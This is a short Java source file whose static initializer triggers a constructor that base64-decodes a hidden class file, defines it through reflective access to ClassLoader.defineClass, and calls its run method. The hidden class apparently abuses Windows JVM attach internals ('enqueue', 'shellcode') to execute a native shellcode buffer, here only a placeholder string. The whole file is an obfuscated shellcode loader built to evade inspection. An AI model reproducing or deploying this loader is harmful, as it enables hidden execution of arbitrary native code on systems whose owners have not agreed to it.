import java.lang.reflect.Method;

public class Low {
    static {
        try {
            Class c = Class.forName(Thread.currentThread().getStackTrace()[1].getClassName());
            c.newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public Low(){
        String code="yv66vgAAADEAJgoABwAZCAAaCgAbABwF//////////8IAB0HAB4KAAkAHwcAIAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdlbnF1ZXVlAQA9KEpbQkxqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspVgEACkV4Y2VwdGlvbnMHACEBAAtvcGVuUHJvY2VzcwEABChJKUoBAANydW4BAAUoW0IpVgcAIgEAClNvdXJjZUZpbGUBABpXaW5kb3dzVmlydHVhbE1hY2hpbmUuamF2YQwACgALAQAGYXR0YWNoBwAjDAAkACUBAAlzaGVsbGNvZGUBABBqYXZhL2xhbmcvT2JqZWN0DAAOAA8BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEACQAHAAAAAAAEAAEACgALAAEADAAAAB0AAQABAAAABSq3AAGxAAAAAQANAAAABgABAAAABgGIAA4ADwABABAAAAAEAAEAEQEIABIAEwABABAAAAAEAAEAEQAJABQAFQACAAwAAAA1AAYAAQAAABUSArgAAxQABCoSBhIGA70AB7gACLEAAAABAA0AAAAOAAMAAAAMAAUADgAUAA8AEAAAAAQAAQAWAAEAFwAAAAIAGA==";
        String code1 = "AAAAAAAAA";
        try {
            byte[] classBytes;
            Class base64=Class.forName("sun.misc.BASE64Decoder");
            Object b64=base64.newInstance();
            classBytes=(byte[]) b64.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(b64,new Object[]{code});
            byte[] bytes = (byte[]) b64.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(b64,new Object[]{code1});
            Method m = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            m.setAccessible(true);
            Class c = (Class) m.invoke(ClassLoader.getSystemClassLoader(), classBytes, 0, classBytes.length);
            Method run = c.getDeclaredMethod("run", byte[].class);
            run.invoke(null, bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void main(String[] args) {

    }
}
